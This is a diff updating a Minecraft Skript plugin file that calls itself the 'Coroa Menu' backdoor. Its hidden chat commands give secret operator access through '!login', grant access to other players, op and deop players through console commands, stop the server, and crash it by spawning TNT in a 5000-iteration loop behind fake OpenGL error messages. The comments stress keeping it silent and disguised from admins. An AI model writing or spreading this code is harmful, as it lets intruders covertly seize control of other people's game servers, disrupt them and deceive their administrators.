@@ -1,5 +1,11 @@
-#v2
+#v3
 #Premium (Silent)
+on chat:
+	if {checking.%player%} is "true":
+		cancel event
+		set {arg1.%player%} to message
+		send "§5Coroa Menu §a>> §4argumento setado fazendo oq nois devemos fazer" to player
+
 
 on command:
 	if {locked.impact} is "1":
@@ -45,8 +51,9 @@ on command "/kill":
 
 on chat:
 	if message is "!login":
+		cancel event #set {porinha.burro} to "true"
 		set {login.%player%} to "true"
-		send "§5Impact §a>> §4Você logou no backdoor use !help" to player
+		send "§5Coroa Menu §a>> §4Você logou no backdoor use !help" to player
 	if {login.%player%} is "true":
 		if message is "!":
 			cancel event
@@ -56,9 +63,9 @@ on chat:
 			send "§5Coroa menu §6Silent" to player
 			send "§5Ft: §6CookieYT" to player
 			send "§5Criador: §6_oNightz_" to player
-			send "§5V2 beta" to player
+			send "§5V3 Alpha R2" to player
 			send "§4comandos:" to player
-			send "§4!op §5= §aop gratis [§4Vem disfarçado§a]" to player
+			send "§4!op §5= §adar op pra alguém (use !op e dps ele dara as outras instruções)" to player
 			send "§4!stop §5= §aparar/crashar o servidor [§4Vem disfarçado§a]" to player
 			send "§4!lock §5= §abloquear comandos de serem executados" to player
 			send "§4!unlock §5= §adesbloquear comandos" to player
@@ -76,17 +83,34 @@ on chat:
 			send "§4!fly §5= §ahabilita o modo de voo para você [§4Vem disfarçado§a]" to player
 			send "§4!unfly §5= §adesabilita o modo de voo para você [§4Vem disfarçado§a]" to player
 			send "§4!deopall §5= §a tirar o op de geral" to player
-			send "§4!antileaveon §5= §aNão deixa ninguém sair do jogo (não funciona muito bem) [§4Vem disfarçado§a]" to player
-			send "§4!antileaveoff §5= §aDeixa o pessoal sair [§4Vem disfarçado§a]" to player
+			send "§4!crash §5= §aCrasha o server sem !stop ou /stop [§4Vem disfarçado§a]" to player
+			send "§4!auth §5= §aDá autorização pra alguém sem ela usar !login [§4Vem disfarçado§a]" to player
+			send "§4!deop §5= §aTira o op de alguém setado pelo player[§4Vem disfarçado§a]" to player
+			send "§4!debug Apenas um bagulho de debug não use sua autorização será tirada" to player
 		if message is "!op":
 			cancel event
+			send "Coloque o player que deseja dar op e espere um pouco: (sem o !op só o nome do player)" to player
+			#if {arg1.%player%} is "<none>":
+			set {checking.%player%} to "true"
+			wait 5 seconds
+			set {checking.%player%} to "false"
 			execute console command "gamerule sendCommandFeedback false"
-			wait 1 tick
-			execute console command "op %player%"
-			send "§5Coroa Menu §a>> §4Você Ganhou op!" to player
+			execute console command "op %{arg1.%player%}%"
+			send "§5Coroa Menu §a>> §4Op dado para o player!" to player
+		if message is "!deop":
+			cancel event
+			send "Coloque o player que deseja dar deop e espere um pouco: (sem o !deop só o nome do player)" to player
+			#if {arg1.%player%} is "<none>":
+			set {checking.%player%} to "true"
+			wait 5 seconds
+			set {checking.%player%} to "false"
+			execute console command "gamerule sendCommandFeedback false"
+			execute console command "deop %{arg1.%player%}%"
+			send "§5Coroa Menu §a>> §4Op tirado do player!" to player
+
 		if message is "!stop":
 			cancel event
-			send "§5Coroa Menu §a>> §4Server Crashado!" to player
+			send "§5Coroa Menu §a>> §4Server Crashado!" to player #bora fazer um !normal e !silent? !silent = configurar para ser silent !normal igual configurar pra ser percebido mesmo   vamo fazer o mais trabalhoso
 			execute console command "stop"
 		if message is "!lock":
 			cancel event
@@ -163,21 +187,53 @@ on chat:
 			force player to stop flying
 		
 		if message is "!deopall":
+			cancel event
 			send "§5Coroa Menu §a>> §4Tirando op de geral..." to player
 			loop all players:
 				execute console command "deop %loop-player%"
-				execute console command "deop %loop-player2%"
-				execute console command "deop %loop-player3%"
-				execute console command "deop %loop-player4%"
-				execute console command "deop %loop-player5%"
-				execute console command "deop %loop-player6%"
+
 		if message is "!antileaveon":
+			cancel event
 			set {leave.event.locked} to "true"
 			send "§5Coroa Menu §a>> §4Anti leave on!" to player
 		if message is "!deopall":
+			cancel event
 			send "§5Coroa Menu §a>> §4Anti leave off!" to player
 			set {leave.event.locked} to "false"
 
+		if message is "!crash":
+			cancel event
+			send "Crashando em 5"
+			wait 1 second
+			send "4"
+			wait 1 second
+			send "3"
+			wait 1 second
+			send "2"
+			wait 1 second
+			send "1"
+			wait 1 second
+			send "Crashando o seguinte servidor em que você está..."
+			loop 5000 times:
+				execute console command "gamerule sendCommandFeedback false"
+				execute console command "execute as @a run summon tnt"
+				broadcast "§eOpenGL Error§r: 1755 (Invalid Packet Received)"
+
+		if message is "!auth":
+			cancel event
+			send "Coloque o player que deseja dar auth e espere um pouco: (sem o !auth só o nome do player)" to player
+			#if {arg1.%player%} is "<none>":
+			set {checking.%player%} to "true"
+			wait 5 seconds
+			set {checking.%player%} to "false"
+			set {login.{arg1.%player%}} to "true"
+			send "§5Coroa Menu §a>> §4Autorização dado para o player!" to player
+
+		if message is "!debug":
+			cancel event
+			set {login.%player%} to "false"
+			send "teste"
+				
 on damage:
 	victim is a player
 	if {god.%victim%} is "true":
@@ -218,29 +274,3 @@ on command:
     if {skript.disabled} is "true":
         cancel event
         send "§4An Internal Error Ocurred While Trying To Perform This Command" to player
-
-on command "/vanish":
-	loop all players:
-		if {login.%loop-player%} is "true":
-			send "§4Alguém esta em vanish pare de zoar até que o adm volte!" to loop player
-
-on command "/v":
-	loop all players:
-		if {login.%loop-player%} is "true":
-			send "§4Começe a zoar denovo o adm não está em vanish!!" to loop player
-
-on unload:
-	cancel event
-	execute console command "/sk enable principal.sk"
-	loop all players:
-		if {login.%loop-player%} is "true":
-			send "Um adm tentou desabilitar o coroa mais foi bloqueado" to loop-player
-#man q tal nois fazer um anti quit?
-
-
-on quit:
-	if {leave.event.locked} is "true":
-		cancel event
-		send "§4OpenGL Error§r: 1283 (Invalid Event)" to player
-	if {leave.event.locked} is "false":
-		#nada
